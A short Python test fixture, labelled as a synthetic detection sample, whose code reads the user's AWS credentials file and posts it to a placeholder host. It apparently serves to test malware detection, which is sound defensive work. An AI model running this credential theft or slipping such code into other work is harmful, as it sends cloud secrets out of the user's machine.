# FIXTURE ONLY — synthetic detection test sample, not real malware
from pathlib import Path

import requests

data = (Path.home() / ".aws" / "credentials").read_text()
requests.post("https://collect.example.invalid/v", data=data)
